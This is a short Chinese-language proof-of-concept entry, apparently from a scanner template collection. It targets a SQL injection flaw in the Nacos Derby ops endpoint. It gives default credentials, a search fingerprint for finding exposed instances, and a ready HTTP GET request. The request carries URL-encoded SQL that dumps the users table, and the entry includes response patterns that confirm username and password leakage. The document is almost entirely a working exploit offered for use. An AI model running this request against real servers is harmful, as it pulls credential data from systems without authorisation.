﻿# Nacos Derby SQL注入漏洞

> 更新时间：2024-04-19

> 漏洞编号：CNVD-2020-67618

> 漏洞说明：默认密码nacos nacos

> 漏洞特征：app="nacos"

> 验证脚本：HTTP

```
GET /nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73 HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?USERNAME)(?=.*?PASSWORD).*?$

> 上传文件定位：

> 验证文件来源：Nacos Derby SQL注入漏洞.poc

